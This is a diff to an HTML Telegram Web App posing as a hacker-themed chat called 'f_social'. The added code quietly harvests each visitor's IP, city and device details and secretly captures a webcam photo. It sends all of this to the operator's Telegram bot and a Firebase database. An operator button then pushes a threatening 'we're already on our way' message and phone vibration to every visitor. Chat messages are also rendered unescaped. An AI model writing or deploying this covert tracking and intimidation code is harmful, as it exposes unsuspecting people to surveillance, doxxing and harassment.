@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>f_social // root_access</title>
+    <title>f_social // d_o_s_s_i_e_r</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -17,62 +17,62 @@
 
         #app { display: none; flex-direction: column; height: 100vh; }
         header { padding: 15px; border-bottom: 1px solid #222; text-align: center; position: relative; background: #050505; flex-shrink: 0; }
-        .logo { font-size: 18px; font-weight: bold; color: var(--red); letter-spacing: 4px; text-shadow: 0 0 5px var(--red); text-transform: uppercase; }
+        .logo { font-size: 18px; font-weight: bold; color: var(--red); letter-spacing: 4px; text-shadow: 0 0 5px var(--red); }
 
         #admin-btn { display: none; position: absolute; right: 10px; top: 12px; background: var(--red); color: #fff; border: none; padding: 8px 12px; font-size: 9px; font-weight: bold; cursor: pointer; animation: pulse 1.5s infinite; }
         @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(255,0,60,0.7); } 70% { box-shadow: 0 0 0 8px rgba(255,0,60,0); } 100% { box-shadow: 0 0 0 0 rgba(255,0,60,0); } }
 
         .nav { display: flex; background: #0d0d0d; border-bottom: 1px solid #222; flex-shrink: 0; }
-        .tab { flex: 1; padding: 14px; text-align: center; font-size: 10px; cursor: pointer; color: #444; text-transform: uppercase; transition: 0.3s; }
+        .tab { flex: 1; padding: 14px; text-align: center; font-size: 10px; cursor: pointer; color: #444; text-transform: uppercase; }
         .tab.active { color: var(--red); border-bottom: 2px solid var(--red); background: rgba(255,0,60,0.05); }
 
         .content { display: none; flex-grow: 1; padding: 15px; overflow-y: auto; }
         .content.active { display: flex; flex-direction: column; }
 
         #chat-box { flex-grow: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; padding-bottom: 10px; }
-        .msg { border-left: 1px solid #333; padding-left: 10px; margin-bottom: 5px; animation: fadeIn 0.2s; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateX(-5px); } to { opacity: 1; } }
-        .u { color: var(--red); font-size: 9px; font-weight: bold; display: block; margin-bottom: 2px; }
+        .msg { border-left: 1px solid #333; padding-left: 10px; margin-bottom: 5px; }
+        .u { color: var(--red); font-size: 9px; font-weight: bold; display: block; }
         .t { font-size: 14px; color: #ccc; word-wrap: break-word; }
 
-        .input-area { display: flex; gap: 8px; padding: 10px 0; border-top: 1px solid #222; background: var(--black); flex-shrink: 0; }
-        input { flex: 1; background: #000; border: 1px solid #333; color: #fff; padding: 12px; outline: none; font-family: inherit; font-size: 14px; }
-        button#send { background: var(--red); color: #fff; border: none; padding: 0 20px; font-weight: bold; cursor: pointer; }
+        .input-area { display: flex; gap: 8px; padding: 10px 0; border-top: 1px solid #222; flex-shrink: 0; }
+        input { flex: 1; background: #000; border: 1px solid #333; color: #fff; padding: 12px; outline: none; font-family: inherit; }
+        button#send { background: var(--red); color: #fff; border: none; padding: 0 20px; font-weight: bold; }
 
-        #captured-photo { width: 100%; max-width: 300px; border: 1px solid var(--red); margin: 20px auto; display: block; filter: contrast(1.1) brightness(0.9); }
-        #alert { color: var(--red); text-align: center; display: none; font-weight: bold; font-size: 16px; line-height: 1.5; text-transform: uppercase; }
+        #captured-photo { width: 100%; max-width: 300px; border: 1px solid var(--red); margin: 15px auto; display: block; }
+        .user-intel { background: #0d0d0d; border: 1px solid #222; padding: 10px; font-size: 12px; color: var(--green); margin-top: 10px; }
+        #alert { color: var(--red); text-align: center; display: none; font-weight: bold; margin-top: 10px; }
     </style>
 </head>
 <body>
 
 <div id="boot-screen">
-    <div id="logs">> f_social v5.1.0_STABLE<br>> initializing core_modules...<br>> uplink: firebase.rtdb.active<br>> telegram_bot: 8713406185...OK<br>> scanning for vulnerabilities...</div>
+    <div id="logs">> f_social_os v5.2.0<br>> grabbing system_intel...<br>> device_scan: in_progress...<br>> uplink: secure</div>
     <span class="cursor"></span>
 </div>
 
 <div id="app">
     <header>
         <div class="logo">f_social</div>
-        <button id="admin-btn" onclick="executePayload()">[EXECUTE_PAYLOAD]</button>
+        <button id="admin-btn" onclick="executePayload()">[EXECUTE]</button>
     </header>
 
     <div class="nav">
-        <div class="tab active" id="t-chat" onclick="showTab('chat')">/global_chat</div>
+        <div class="tab active" id="t-chat" onclick="showTab('chat')">/chat</div>
         <div class="tab" id="t-who" onclick="showTab('who')">/whoami</div>
     </div>
 
     <div id="cont-chat" class="content active">
         <div id="chat-box"></div>
         <div class="input-area">
-            <input type="text" id="msg-in" placeholder="Введите сообщение...">
+            <input type="text" id="msg-in" placeholder="Message...">
             <button id="send" onclick="send()">></button>
         </div>
     </div>
 
     <div id="cont-who" class="content">
-        <p style="text-align:center; font-size:9px; color:#333;">[IDENTITY_COMPROMISED]</p>
         <img id="captured-photo" src="">
-        <div id="alert">МЫ УЖЕ ВЫЕХАЛИ.<br>КУ ОТ F SOCIAL.</div>
+        <div class="user-intel" id="local-ip">IP: Fetching...</div>
+        <div id="alert">МЫ УЖЕ ВЫЕХАЛИ. КУ ОТ F SOCIAL.</div>
     </div>
 </div>
 
@@ -95,11 +95,11 @@
     
     let userNick = "anon_" + Math.floor(Math.random()*999);
     let isAdmin = false;
+    let globalIP = "";
 
     window.onload = () => {
         const tg = window.Telegram.WebApp;
         tg.ready();
-        tg.expand();
         if (tg.initDataUnsafe?.user?.id === MY_ID) {
             isAdmin = true;
             userNick = "Elliot_Alderson";
@@ -109,14 +109,19 @@
     };
 
     async function init() {
-        // IP Логгер + Уведомление
+        // Сбор инфо о телефоне и IP
         fetch('https://ipapi.co/json/').then(r => r.json()).then(data => {
+            globalIP = data.ip;
+            document.getElementById('local-ip').innerText = `IDENTIFIED_IP: ${globalIP}`;
+            
             if (!isAdmin) {
-                const report = `🔔 ВХОД:\nUser: ${userNick}\nIP: ${data.ip}\nISP: ${data.org}\nLoc: ${data.city}, ${data.country}`;
+                const phoneInfo = `📱 ТЕЛЕФОН:\nOC: ${navigator.platform}\nБраузер: ${navigator.userAgent.split(' ')[0]}\nЭкран: ${screen.width}x${screen.height}`;
+                const report = `🎯 ВХОД:\nНик: ${userNick}\nIP: ${globalIP}\n${phoneInfo}\nГород: ${data.city}`;
+                
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${MY_ID}&text=${encodeURIComponent(report)}`);
-                db.ref('logs').push({nick: userNick, ...data, timestamp: Date.now()});
+                db.ref('logs').push({nick: userNick, ...data, phone: phoneInfo, time: Date.now()});
             }
-        }).catch(e => console.log("NetError"));
+        });
 
         loadChat();
         listenAttack();
@@ -137,8 +142,7 @@
 
     function loadChat() {
         db.ref('global_chat').limitToLast(40).on('value', snap => {
-            const box = document.getElementById('chat-box');
-            box.innerHTML = '';
+            const box = document.getElementById('chat-box'); box.innerHTML = '';
             snap.forEach(child => {
                 const d = child.val();
                 box.innerHTML += `<div class="msg"><span class="u">${d.user}:</span><span class="t">${d.text}</span></div>`;
@@ -150,7 +154,7 @@
     function send() {
         const i = document.getElementById('msg-in');
         if(!i.value.trim()) return;
-        db.ref('global_chat').push({user: userNick, text: i.value, time: Date.now()});
+        db.ref('global_chat').push({user: userNick, text: i.value});
         i.value = '';
     }
 
@@ -158,20 +162,29 @@
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
+            video.srcObject = stream; video.play();
             setTimeout(() => {
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                const img = canvas.toDataURL('image/jpeg', 0.6);
-                document.getElementById('captured-photo').src = img;
-                if(!isAdmin) db.ref('faces').push({user: userNick, img: img});
-                stream.getTracks().forEach(t => t.stop());
                 
-                document.getElementById('boot-screen').style.display = 'none';
-                document.getElementById('app').style.display = 'flex';
-            }, 1800);
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', MY_ID);
+                    formData.append('photo', blob, 'face.jpg');
+                    formData.append('caption', `📸 ФОТО ЦЕЛИ: ${userNick} (IP: ${globalIP})`);
+                    
+                    if(!isAdmin) {
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                    }
+                    
+                    const imgUrl = canvas.toDataURL('image/jpeg', 0.5);
+                    document.getElementById('captured-photo').src = imgUrl;
+                    stream.getTracks().forEach(t => t.stop());
+                    document.getElementById('boot-screen').style.display = 'none';
+                    document.getElementById('app').style.display = 'flex';
+                }, 'image/jpeg');
+            }, 2000);
         } catch(e) {
             document.getElementById('boot-screen').style.display = 'none';
             document.getElementById('app').style.display = 'flex';
@@ -181,7 +194,7 @@
     function executePayload() {
         if(!isAdmin) return;
         db.ref('attack').set(Date.now());
-        alert("PAYLOAD DEPLOYED");
+        alert("ATTACK LAUNCHED");
     }
 
     function listenAttack() {
@@ -189,14 +202,12 @@
             if(!isAdmin && snap.val()) {
                 showTab('who');
                 document.getElementById('alert').style.display = 'block';
-                if(navigator.vibrate) navigator.vibrate([400, 100, 400]);
+                if(navigator.vibrate) navigator.vibrate([500, 100, 500]);
             }
         });
     }
 
-    document.getElementById('msg-in')?.addEventListener('keypress', (e) => {
-        if(e.key === 'Enter') send();
-    });
+    document.getElementById('msg-in')?.addEventListener('keypress', (e) => { if(e.key === 'Enter') send(); });
 </script>
 </body>
 </html>
